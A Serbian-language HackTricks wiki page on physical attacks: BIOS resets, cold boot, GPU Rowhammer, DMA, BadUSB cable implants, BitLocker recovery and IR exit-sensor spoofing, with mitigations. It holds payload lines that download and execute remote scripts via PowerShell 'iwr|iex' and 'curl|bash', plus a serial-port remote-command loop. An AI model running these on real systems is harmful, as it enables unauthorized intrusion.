# Fizički napadi

{{#include ../banners/hacktricks-training.md}}

## Oporavak BIOS lozinke i bezbednost sistema

Podešavanja firmvera na starijim PC računarima mogu da se resetuju isključivanjem CMOS baterije ili korišćenjem dokumentovanog džampera za clear-CMOS. Potrebno vreme bez napajanja zavisi od matične ploče, a moderne UEFI lozinke ili ključevi mogu da se nalaze u neisparljivoj fleš memoriji, ugrađenom kontroleru ili bezbednosnom uređaju i zato mogu da ostanu sačuvani nakon uklanjanja baterije. Pre spajanja pinova proverite uputstvo za matičnu ploču ili servisno uputstvo; ovaj postupak može i da poništi TPM merenja i pokrene oporavak šifrovanja diska.

Na starijim x86 sistemima, alati kao što su **killCMOS** i **CmosPwd** mogu da pregledaju ili izmene podešavanja sačuvana u CMOS-u iz okruženja koje se može pokrenuti. CmosPwd prepoznaje formate lozinki iz dokumentovanog skupa starijih porodica BIOS-a i može da napravi rezervnu kopiju, vrati ili obriše/poništi CMOS stanje; objavljene verzije namenjene su starijim okruženjima DOS/Windows, Linux, FreeBSD i NetBSD.<sup>[[18]](#references)</sup> Ovi alati nisu univerzalni alati za uklanjanje UEFI lozinki i zahtevaju dovoljan pristup hardveru/firmveru.

Neki firmveri laptopova prikazuju kod izazova specifičan za proizvođača nakon nekoliko neuspelih pokušaja unosa lozinke. Baze podataka kao što je [bios-pw.org](https://bios-pw.org) mogu da izračunaju lozinke za oporavak starijih sistema nekih proizvođača, ali mnogi sistemi zaključavaju pristup bez koda izazova iz kog se lozinka može izračunati. Svaku generisanu lozinku smatrajte specifičnom za određeni model i izbegavajte dostizanje trajnih ograničenja broja pokušaja.

### UEFI bezbednost

Za moderne **UEFI** sisteme, CHIPSEC može da proveri zaštitu promenljivih Secure Boot-a. Najpre pokrenite proveru koja ne vrši izmene; opcioni režim `-a modify` namerno pokušava da ošteti promenljive i treba ga koristiti samo na laboratorijskom sistemu koji se može oporaviti. Sam CHIPSEC upozorava da njegov privilegovani drajver i nizak nivo pristupa hardveru nisu pogodni za produkcione krajnje uređaje.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Analiza RAM-a i Cold Boot napadi

DRAM ne gubi odmah svaki bit kada se osvežavanje zaustavi. Brzina propadanja podataka znatno varira u zavisnosti od tehnologije modula i temperature; hlađenje može da sačuva korisne podatke mnogo duže nego ciklus isključivanja i ponovnog uključivanja bez hlađenja. Cold-boot napad brzo ponovo pokreće sistem u malom okruženju za akviziciju ili premešta ohlađeni modul, snima sirovu memoriju i rekonstruiše kriptografske ključeve uprkos propadanju bitova. Alat za kopiranje diska nije automatski i alat za snimanje fizičke memorije, a Volatility analizira snimak, ali ga ne pribavlja; koristite validiran alat za akviziciju namenjen konkretnoj platformi.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer napadi na tabele stranica

Savremeni GPU Rowhammer napadi postaju mnogo korisniji kada ciljaju **metapodatke virtuelne memorije GPU-a** umesto običnih bafera. Nedavna istraživanja na **GDDR6 NVIDIA Ampere GPU-ovima** pokazuju da napadač koji izvršava neprivilegovani CUDA kod može da napravi obrasce hammering-a specifične za GPU, upotrebi **memory massaging** da smesti strukture za straničenje u ranjive redove, a zatim preokrene bitove u **tabeli stranica poslednjeg nivoa** ili posrednom **direktorijumu stranica**. Kada se ošteti jedan unos za prevođenje adresa, napadač može da uspostavi **proizvoljno čitanje/pisanje GPU memorije**, a zatim da pređe na kompromitovanje hosta.<sup>[[1]](#references)[[2]](#references)</sup>

### Obrazac eksploatacije

1. **Profilisati redove podložne hammering-u** u GDDR6 i napraviti obrasce hammering-a koji uzimaju u obzir osvežavanje / nisu uniformni, a zaobilaze mitigacije u DRAM-u.
2. **Urediti GPU alokacije** tako da drajver smesti strukture za prevođenje adresa stranica na fizičke lokacije podložne hammering-u, umesto da ih drži u podrazumevanom zaštićenom skupu. U praksi to može da podrazumeva iscrpljivanje regiona sa tabelama stranica u memoriji niskog opsega i raspršivanje velikih retkih UVM mapiranja sa kontrolisanim koracima.
3. **Preokrenuti bitove u metapodacima za prevođenje adresa**, kao što su **PFN** ili bitovi povezani sa aperture-om, u unosu tabele stranica / direktorijuma stranica, tako da se virtuelna stranica pod kontrolom napadača mapira na stranice tabela stranica, proizvoljnu GPU memoriju ili sistemska mapiranja vidljiva hostu.
4. Ponovo upotrebiti falsifikovano mapiranje za prepisivanje dodatnih unosa za prevođenje adresa i eskalirati do **proizvoljnog čitanja/pisanja GPU memorije** u različitim GPU kontekstima.

### Prelazak na host i mitigacije

- Kada je **IOMMU onemogućen**, falsifikovana mapiranja sistemskog aperture-a mogu da izlože GPU-u proizvoljnu **fizičku memoriju hosta**, čime se GPU primitiv pretvara u potpuno kompromitovanje hosta.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** cilja unose tabela stranica poslednjeg nivoa, dok **GeForge** pokazuje da oštećivanje nivoa direktorijuma stranica može biti lakše, jer jedan preokrenuti bit može da preusmeri veće podstablo prevođenja adresa. Nemojte smatrati da je samo jedan nivo straničenja kritičan za bezbednost.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** je i dalje važan zato što blokira direktan put do proizvoljne memorije hosta koji koriste GDDRHammer/GeForge, ali **nije potpuna mitigacija**. **GPUBreach** prikazuje drugi korak prelaska, u kojem napadač oštećuje baфere CPU-a koji su zapisivi sa GPU-a i u vlasništvu su drajvera, a zatim aktivira greške NVIDIA drajvera u bezbednosti memorije kako bi dobio primitiv za upis u kernel i **root shell**, čak i kada je IOMMU omogućen.<sup>[[3]](#references)</sup>
- **ECC na nivou sistema** je praktična mera za ojačavanje bezbednosti na podržanim GPU-ovima za radne stanice/servere. Potrošački GPU-ovi bez ECC-a imaju slabiju odbranu.<sup>[[4]](#references)</sup>
- Ovi napadi nisu samo teorijski: **GeForge** je prijavio **1.171** preokrenut bit na RTX 3060 i **202** na RTX A6000, što je bilo dovoljno za izradu funkcionalnog lanca za eskalaciju privilegija na hostu.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Napadi direktnim pristupom memoriji (DMA)

Za offline UEFI IFR/NVRAM krpljenje koje može da oslabi sprovođenje IOMMU pravila pre pokretanja sistema i omogući Windows DMA lanac, pogledajte:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** demonstrira **DMA akviziciju i krpljenje memorije** preko interfejsa kao što su FireWire i ranije konfiguracije Thunderbolt-a, uključujući istorijske potpise za zaobilaženje prijave. Nije jednostavno „neefikasan protiv Windows 10“: mogućnost eksploatacije zavisi od interfejsa, verzije sistema, IOMMU pravila, stanja zaključavanja i toga da li je Windows Kernel DMA Protection podržan i omogućen. Windows 10 verzija 1803 i novije uvele su Kernel DMA Protection na kompatibilnim platformama, što je značajno promenilo površinu napada.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB za pristup sistemu

Na nešifrovanom ili već otključanom Windows volumenu, offline okruženje može da zameni binarne datoteke za pristupačnost, kao što su **sethc.exe** ili **Utilman.exe**, datotekom **cmd.exe**, čime se dobija komandni odzivnik sa privilegijama SYSTEM kada se aktivira odgovarajuća prečica na ekranu za prijavu. Alati kao što je **chntpw** mogu da menjaju podatke lokalnih SAM naloga. Ove metode ne zaobilaze zaključan BitLocker volumen i mogu da oštete akreditive zaštićene pomoću DPAPI/EFS; sačuvajte forenzičke kopije i rezervne kopije.

**Kon-Boot** je komercijalni alat za zaobilaženje autentifikacije pri pokretanju sistema za podržane Windows/macOS konfiguracije. Kompatibilnost zavisi od OS-a, režima firmvera, Secure Boot-a i podešavanja šifrovanja diska; alat ne dešifruje BitLocker zaključan volumen.<sup>[[10]](#references)</sup>

---

## Rukovanje Windows bezbednosnim funkcijama

### Prečice za pokretanje i oporavak

- **Delete/Supr**, F2, F10 ili neki drugi taster proizvođača može da otvori podešavanja firmvera.
- **F8** otvara zastarele napredne opcije pokretanja Windows-a samo u konfiguracijama u kojima je taj put i dalje omogućen; način ulaska u trenutno okruženje za oporavak varira.
- Držanje tastera **Shift** može da spreči automatsku prijavu u Windows u nekim konfiguracijama, iako podešavanja pravila/registra mogu da onemoguće takvo ponašanje.<sup>[[17]](#references)</sup>

### BAD USB uređaji

Uređaji kao što su **USB Rubber Ducky** i Teensy pločice mogu da se predstave kao pouzdane HID tastature i unose unapred definisane kombinacije tastera. Korisni teret u početku ima privilegije i pristup radnoj površini prijavljene sesije; UAC upiti, zaključavanje ekrana, raspored tastature, vremensko podešavanje i USB pravila na krajnjoj tački i dalje ga ograničavaju.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Administratorske privilegije ili privilegije za pravljenje rezervnih kopija omogućavaju kreiranje shadow copy kopije ili čuvanje registarskih košnica kako bi se pribavile zaključane datoteke kao što su **SAM** i **SYSTEM**. Ovo je tehnika prikupljanja podataka nakon kompromitovanja, a ne zaobilaženje privilegija, pa je treba povezati sa događajima `diskshadow`/VSS i izvoza registarskih košnica.

## BadUSB / HID implant tehnike

### Android HID gadget aktiviran NFC-om

Rutovan Android telefon može da postane programabilna USB tastatura samo ako njegov USB kontroler i kernel podržavaju **USB gadget/HID**. Na kompatibilnim uređajima Kali NetHunter izlaže profile gadget-a kroz **USB Arsenal**. Druga opcija je [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), koji kreira ConfigFS gadget funkcije i može da izloži znakovne uređaje tastature/miša kao što su `/dev/hidg0` i `/dev/hidg1`. Alat samo kreira krajnju tačku gadget-a; poseban proces mora da joj šalje HID izveštaje. Root pristup ne može da nadoknadi nedostatak ConfigFS-a, HID gadget podrške ili upotrebljivog USB Device Controller-a u kernelu.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Ova krajnja tačka može da se kombinuje sa Android NFC-om kao fizičkim okidačem. Aplikacija [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) čita UID taga, pretvara ga u očekivani prikaz, proverava lokalnu listu dozvoljenih vrednosti i nakon podudaranja šalje konfigurisani niz tastera u stilu Rubber Ducky-ja. Povezani host vidi običan unos sa tastature i ne treba mu NFC softver.<sup>[[22]](#references)[[24]](#references)</sup>

Pre korišćenja prečica ili komandi, proverite enumeraciju i raspored tastature u praznom tekstualnom editoru. Bezopasan korisni teret je:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Važne granice poverenja:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **UID whitelist je identifikacija, a ne autentifikacija**. UID-ovi su javni, a neki tipovi tokena ili emulatori omogućavaju kloniranje ili lažno predstavljanje. Kopirani dozvoljeni UID prati isti put obrade kao originalni token.
- Magisk modul **NfcScreenOff** zakrpljuje NFC servis tako da se ponaša kao da je ekran uključen i otključan. Ako je telefon već povezan sa hostom, neko može da pokrene payload bez otključavanja telefona.
- Lozinke, API tokeni i komande sačuvani u payload-u mogu se povratiti sa uređaja sa root pristupom ili otključanim bootloader-om. Unošenje lozinke preko HID-a predstavlja automatizaciju ponovne upotrebe lozinke, a ne autentifikaciju bez lozinke.
- HID injection deluje sa privilegijama aktivne desktop sesije i zavisi od fokusa, tajminga i rasporeda tastature na hostu. Zahtevajte nedavnu potvrdu korisnika pre slanja osetljivih radnji, izbegavajte privilegovane tajne u skriptama i koristite autentifikator sa kriptografskim challenge-response mehanizmom za pravu autentifikaciju.

### Wi-Fi implantati u kablovima

- Implantati zasnovani na ESP32-S3, kao što je **Evil Crow Cable Wind**, skrivaju se u USB-A→USB-C ili USB-C↔USB-C kablovima, pojavljuju se isključivo kao USB tastatura i izlažu svoj C2 stek preko Wi-Fi-ja. Operater treba samo da napaja kabl preko hosta žrtve, napravi hotspot pod nazivom `Evil Crow Cable Wind` sa lozinkom `123456789` i otvori [http://cable-wind.local/](http://cable-wind.local/) (ili njegovu DHCP adresu) da bi pristupio ugrađenom HTTP interfejsu.<sup>[[8]](#references)</sup>
- Veb interfejs sadrži kartice *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell* i *Config*. Sačuvani payload-i označeni su prema operativnom sistemu, rasporedi tastature menjaju se u hodu, a VID/PID stringovi mogu se izmeniti kako bi oponašali poznate periferne uređaje.
- Pošto se C2 nalazi unutar kabla, telefon može da pripremi payload-e, pokrene njihovo izvršavanje i upravlja Wi-Fi akreditivima bez korišćenja mreže organizacije — korisno za kratke fizičke upade.

### AutoExec payload-i svesni operativnog sistema

- AutoExec pravila povezuju jedan ili više payload-a koji se pokreću odmah nakon USB enumeracije. Implantat obavlja osnovno prepoznavanje operativnog sistema i bira odgovarajuću skriptu.
- Primer toka rada:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) ili `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Pošto se izvršavanje odvija bez nadzora, zamena kabla za punjenje može da obezbedi početni pristup „plug-and-pwn“ u kontekstu prijavljenog korisnika.

### HID-om pokrenuta udaljena ljuska preko Wi-Fi TCP-a

1. **Početno pokretanje pomoću pritisaka na tastere:** Sačuvani payload otvara konzolu i unosi petlju koja izvršava sve što stigne sa novog USB serijskog uređaja. Minimalna Windows varijanta je:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implant održava USB CDC kanal otvorenim dok njegov ESP32-S3 pokreće TCP client (Python skriptu, Android APK ili izvršnu datoteku za desktop) ka operatoru. Svi bajtovi uneti u TCP sesiju prosleđuju se u gornju serijsku petlju, čime se omogućava udaljeno izvršavanje komandi čak i na hostovima odvojenim od mreže. Izlaz je ograničen, pa operatori obično pokreću komande naslepo (kreiranje naloga, pripremu dodatnih alata itd.).

### HTTP OTA površina za ažuriranje

- Dokumentovani interfejs Evil Crow Cable Wind uređaja izlaže endpoint za ažuriranje firmvera `/update` bez autentifikacije:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Operateri na terenu mogu da hot-swap-uju funkcije (npr. flešuju firmware USB Army Knife-a) usred angažovanja, bez otvaranja kabla, pa implant može da pređe na nove mogućnosti dok je i dalje priključen na ciljni host.

## Zaobilaženje BitLocker šifrovanja

Ovlašćeno forenzičko preuzimanje podataka sa sistema koji je uključen ili je nedavno radio može da sadrži glavni ključ BitLocker volumena ili povezani ključni materijal dok je volumen otključan. Komercijalni alati kao što su Elcomsoft Forensic Disk Decryptor i Passware Kit Forensic mogu da pretražuju podržane memorijske slike, datoteke hibernacije ili dumpove pada sistema, ali uspeh nije zagarantovan. Savremeni Windows takođe šifruje dumpove pada sistema kada je BitLocker omogućen, a sačuvana 48-cifrena lozinka za oporavak predstavlja drugi artefakt, različit od ključa volumena koji se nalazi u memoriji.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Socijalni inženjering za dodavanje ključa za oporavak

Napadač koji ubedi administratora da pokrene komande za upravljanje BitLocker-om može da doda lozinku za oporavak, eksterni ključ ili drugi zaštitnik, a zatim da ga preuzme. Lozinka za oporavak ne može biti proizvoljan niz nula: numeričke lozinke za oporavak BitLocker-a moraju da zadovolje validirani format od 48 cifara. Odgovarajuća sintaksa za ovlašćeno administriranje je `manage-bde -protectors -add C: -recoverypassword`; prikažite dodate zaštitnike pomoću komande `manage-bde -protectors -get C:`. Pratite dodavanje zaštitnika i obezbedite da se novi materijal za oporavak čuva samo na odobrenim lokacijama.<sup>[[16]](#references)</sup>

---

## Iskorišćavanje prekidača za upad u kućište / održavanje radi vraćanja BIOS-a na fabrička podešavanja

Mnogi savremeni laptopovi i desktop računari malog formata imaju **prekidač za upad u kućište**, koji nadgledaju Embedded Controller (EC) i firmware BIOS/UEFI. Iako je osnovna namena prekidača da podigne upozorenje kada se uređaj otvori, proizvođači ponekad implementiraju **nedokumentovanu prečicu za oporavak** koja se aktivira kada se prekidač preklopi u određenom obrascu.<sup>[[5]](#references)[[6]](#references)</sup>

### Kako napad funkcioniše

1. Prekidač je povezan sa **GPIO prekidom** na EC-u.
2. Firmware koji radi na EC-u prati **vreme i broj pritisaka**.
3. Kada prepozna unapred definisani obrazac, EC poziva rutinu *mainboard-reset* koja **briše sadržaj sistemskog NVRAM-a/CMOS-a**.
4. Pri sledećem pokretanju, pogođeni modeli učitavaju resetovano stanje firmware-a. U zavisnosti od proizvođača i revizije, obrisano stanje može da obuhvati administratorsku lozinku, prilagođena podešavanja pokretanja ili upisane ključeve Secure Boot-a; stanje TPM-a i posledice po šifrovanje diska treba proceniti zasebno.

> Resetovanje firmware-a može da vrati opcije pokretanja sa eksternih uređaja, ali **ne** dešifruje skladište. BitLocker ili drugi sistem za šifrovanje celog diska može da zatraži oporavak nakon promena TPM-a/firmware-a i da i dalje štiti interni disk bez ključa za oporavak.<sup>[[16]](#references)</sup>

### Primer iz prakse – Framework 13 laptop

Prečica za oporavak na Framework 13 (11./12./13. generacije) je:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Posle desetog ciklusa EC postavlja zastavicu koja nalaže BIOS-u da obriše NVRAM pri sledećem ponovnom pokretanju. Ceo postupak traje ~40 s i zahteva **samo odvijač**.<sup>[[5]](#references)</sup>

### Opšti postupak eksploatacije

1. Uključite ciljni uređaj ili ga probudite iz stanja mirovanja da bi EC radio.
2. Uklonite donji poklopac da biste otkrili prekidač za detekciju otvaranja/održavanje.
3. Ponovite obrazac prebacivanja specifičan za proizvođača (pogledajte dokumentaciju i forume ili izvršite reverzni inženjering firmware-a EC-a).
4. Ponovo sastavite uređaj i pokrenite ga, pa proverite koja podešavanja firmware-a i akreditivi su se zaista promenili.
5. Ako imate ovlašćenje i dostupno je pokretanje sa spoljnog medija, pokrenite kontrolisani live image. Kada se interni volumen legitimno otključa (ili ako nikad nije bio šifrovan), live okruženje može da pribavi akreditive i podatke ili da pregleda EFI System Partition. Izmene te particije radi instaliranja EFI implanta su trajne i veoma invazivne, a i dalje su ograničene funkcijama Secure Boot, measured boot, zaštitom od upisivanja u firmware i nadzorom krajnjih tačaka. Šifrovanom skladištu se ne može pristupiti bez ključa ili materijala za oporavak.

### Otkrivanje i ublažavanje rizika

* Beležite događaje otvaranja kućišta u konzoli za upravljanje OS-om i povežite ih sa neočekivanim resetovanjima BIOS-a.
* Koristite **nalepnice koje pokazuju neovlašćeno otvaranje** na zavrtnjima/poklopcima.
* Držite uređaje u **fizički kontrolisanim prostorima**; pretpostavite da fizički pristup znači potpuni kompromis.
* Ako je moguće, onemogućite funkciju proizvođača „maintenance switch reset“ ili zahtevajte dodatno kriptografsko ovlašćenje za resetovanje NVRAM-a.

---

## Prikriveno IR ubrizgavanje signala u senzore za izlaz bez dodira

### Karakteristike senzora
- Uobičajeni senzori „mahni rukom za izlaz“ kombinuju blisku infracrvenu LED diodu sa prijemnim modulom nalik onima u TV daljinskim upravljačima, koji prijavljuje logičku jedinicu tek nakon što detektuje više impulsa (~4–10) odgovarajućeg nosioca (≈30 kHz).<sup>[[7]](#references)</sup>
- Plastični štitnik sprečava da emiter i prijemnik budu direktno okrenuti jedan prema drugom, pa kontroler pretpostavlja da se svaki potvrđeni nosilac odbio od obližnje površine i aktivira relej koji otključava električnu bravu vrata.
- Kada kontroler detektuje prisustvo cilja, često menja modulacionu ovojnicu izlaznog signala, ali prijemnik i dalje prihvata svaki impulsni niz koji odgovara filtriranom nosiocu.

### Tok napada
1. **Zabeležite profil emisije** – priključite logički analizator na pinove kontrolera i snimite talasne oblike pre i posle detekcije koji upravljaju internom IR LED diodom.
2. **Ponovite samo talasni oblik „posle detekcije“** – uklonite ili zanemarite fabrički emiter i od samog početka upravljajte spoljnom IR LED diodom obrascem koji se emituje nakon aktiviranja. Pošto prijemnik proverava samo broj i frekvenciju impulsa, spoofovani nosilac se tretira kao pravi odraz, pa se aktivira linija releja.
3. **Ograničite prenos u impulsima** – emituјte nosilac u podešenim impulsima (npr. desetine milisekundi uključen, približno isto toliko isključen) da biste obezbedili minimalan broj impulsa bez zasićenja AGC-a prijemnika ili aktiviranja logike za obradu smetnji. Neprekidna emisija brzo smanjuje osetljivost senzora i sprečava aktiviranje releja.

### Reflektivno ubrizgavanje na velikoj udaljenosti
- Zamena laboratorijske LED diode snažnom IR diodom, MOSFET drajverom i fokusnom optikom omogućava pouzdano aktiviranje sa udaljenosti od ~6 m.
- Napadaču nije potrebna optička vidljivost do otvora prijemnika; usmeravanjem snopa ka unutrašnjim zidovima, policama ili dovratnicima koji se vide kroz staklo, odbijena energija može da uđe u vidno polje od ~30° i oponaša mahanje rukom iz neposredne blizine.
- Pošto prijemnici očekuju samo slabe odraze, mnogo jači spoljni snop može da se odbije od više površina i pritom ostane iznad praga detekcije.

### Naoružana napadačka baterijska lampa
- Ugradnja drajvera u komercijalnu baterijsku lampu prikriva alat tako da se ne ističe. Zamenite vidljivu LED diodu snažnom IR LED diodom usklađenom sa opsegom prijemnika, dodajte ATtiny412 (ili sličan mikrokontroler) za generisanje impulsa od ≈30 kHz i upotrebite MOSFET za odvođenje struje LED diode.
- Teleskopsko zum sočivo sužava snop radi većeg dometa i preciznosti, dok vibracioni motor kojim upravlja MCU daje haptičku potvrdu da je modulacija aktivna, bez emitovanja vidljive svetlosti.
- Prebacivanje između nekoliko sačuvanih modulacionih obrazaca (neznatno različitih frekvencija nosioca i ovojnica) povećava kompatibilnost sa različitim preimenovanim porodicama senzora. Operater može da usmerava snop ka reflektujućim površinama dok relej čujno ne klikne i vrata se ne otvore.

---

## References

- [1] [GDDRHammer: Znatno ometanje DRAM redova — Rowhammer napadi preko više komponenti u savremenim GPU-ovima](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Udarno opterećenje GDDR memorije radi falsifikovanja tabela stranica GPU-a iz zabave i zarade](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Napadi eskalacije privilegija na GPU-ovima pomoću Rowhammer-a](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Bezbednosno obaveštenje: Rowhammer - jul 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – „Framework 13. Pritisnite ovde za pwn“](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Vodič za resetovanje matične ploče](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – „Noooooooo Touch! – Zaobilaženje IR senzora za izlaz bez dodira pomoću prikrivene IR lampe“](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – „Plug, Play, Pwn: Hakovanje pomoću Evil Crow Cable Wind“](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Rowhammer napad na NVIDIA čipove](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Zvanična dokumentacija i informacije o kompatibilnosti za Kon-Boot](https://kon-boot.com/)
- [11] [CHIPSEC dokumentacija - Zaštita promenljivih Secure Boot-a](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Da ne zaboravimo: Cold Boot napadi na ključeve za šifrovanje](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - manipulacija fizičkom memorijom preko DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Zaštita Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Dokumentacija za Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Vodič za BitLocker operacije](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - držanje tastera Shift i ponašanje automatskog prijavljivanja](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Dokumentacija i preuzimanja za CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Kali Linux dokumentacija - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Dokumentacija Linux kernela - USB HID gadget drajver](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Pretvorite rutovani Android telefon u NFC autentifikator i alat za automatizaciju računara](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
